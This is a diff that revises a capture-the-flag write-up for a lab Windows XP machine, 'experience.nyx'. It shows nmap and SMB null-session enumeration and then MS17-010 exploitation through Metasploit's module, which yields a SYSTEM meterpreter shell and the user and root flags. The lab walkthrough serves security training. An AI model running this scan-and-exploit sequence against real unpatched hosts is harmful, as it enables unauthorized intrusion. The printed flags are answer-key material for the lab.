@@ -14,9 +14,9 @@ Another MS17-010/EternalBlue box, this time exploited through Metasploit's `ms17
 
 ## Enumeration
 
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn experience.nyx
@@ -58,12 +58,17 @@ Host script results:
 |_clock-skew: mean: 13h30m00s, deviation: 4h56m59s, median: 10h00m00s
 ```
 
+The scripts pin it down: Windows XP, with SMBv1 in play and message signing disabled — exactly the profile MS17-010 targets.
+
 ### SMB Enumeration
 
 ```bash
 $ nxc smb experience.nyx
 SMB         experience.nyx  445    EXPERIENCE       [*] Windows 5.1 x32 (name:EXPERIENCE) (domain:experience) (signing:False) (SMBv1:True) (Null Auth:True)
 ```
+
+`Windows 5.1` is the internal version number for XP, and null authentication succeeds. A share listing is worth a try, but it's refused:
+
 ```bash
 $ nxc smb experience.nyx -u '' -p '' --shares
 SMB         experience.nyx  445    EXPERIENCE       [*] Windows 5.1 x32 (name:EXPERIENCE) (domain:experience) (signing:False) (SMBv1:True) (Null Auth:True)
@@ -71,14 +76,18 @@ SMB         experience.nyx  445    EXPERIENCE       [+] experience\:
 SMB         experience.nyx  445    EXPERIENCE       [-] Error enumerating shares: STATUS_ACCESS_DENIED
 ```
 
-`rpcclient` connects over a null session and queries the server directly for its identity — often enough on its own to pin down the exact OS build:
+A null-session `rpcclient` query for server info is the next thing to try, but it's rejected too — the null session gets a foot in the door without being allowed to read anything useful:
 
 ```bash
 $ rpcclient -NU "" experience.nyx -c "srvinfo"
 do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
 ```
 
+Nothing is readable over SMB without credentials, so the way in has to be the SMBv1 flaw itself rather than an exposed share.
+
 ### Confirming MS17-010
+
+`nmap`'s SMB vulnerability scripts check directly for known SMB flaws:
 
 ```bash
 $ sudo nmap -p 445 --script="smb-vuln*" experience.nyx
@@ -119,13 +128,13 @@ Host script results:
 |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
 ```
 
-The target is vulnerable to the same MS17-010 flaw seen on other legacy Windows boxes.
+The box flags for two separate RCE bugs — the older MS08-067 and MS17-010. Either would land code execution; MS17-010 is the more reliable of the two, so it's the one taken forward.
 
 ## Initial Access
 
 ### Exploitation via Metasploit
 
-This time the exploit is run through Metasploit's module instead of a standalone tool:
+Rather than a standalone tool, this time Metasploit's module carries the exploit — MS17-010 is a kernel-level SMBv1 bug, so a hit lands as SYSTEM with no lower-privileged intermediate stage:
 
 ```bash
 $ msfconsole -q
@@ -137,9 +146,10 @@ meterpreter > getuid
 meterpreter > sysinfo
 meterpreter > shell
 ```
+
 <img src="../Images/experience/Pasted image 20260531155902.png"/>
 
-`getuid` and `sysinfo` confirm SYSTEM-level access straight from exploitation, the same as with any successful MS17-010 hit — it's a kernel exploit, so there's no lower-privileged intermediate stage.
+`getuid` and `sysinfo` confirm SYSTEM-level access straight from exploitation, and dropping into a `shell` reaches the flags — both sit in `bill`'s Desktop under the old `C:\Documents and Settings\` tree:
 
 ```cmd
 C:\Documents and Settings>dir bill
@@ -180,8 +190,10 @@ c1d5e7e4efece4a6022c4a4080c8114d
 > **User flag:** `f9e24c8da0686680decee9e594178a2e`
 > **Root flag:** `c1d5e7e4efece4a6022c4a4080c8114d`
 
+Both flags sit together, since the exploit grants SYSTEM from the very first shell — there's no separate privilege escalation phase on this box.
+
 ## Takeaways
 
 - `C:\Documents and Settings\` versus `C:\Users\` is a quick, reliable way to date a Windows filesystem — the former was replaced starting with Vista, so its presence alone narrows the target down significantly.
 - The same vulnerability can have multiple usable exploits with different trade-offs — a standalone script versus a Metasploit module, both landing the same outcome through different tooling.
-- A null RPC session (`rpcclient -NU ""`) is worth trying on any SMB target before assuming credentials are required — plenty of legacy and misconfigured hosts still answer basic identity queries to anyone.
+- A null RPC session (`rpcclient -NU ""`) is worth trying on any SMB target before assuming credentials are required — plenty of legacy and misconfigured hosts still answer basic identity queries to anyone, even where this one refused.
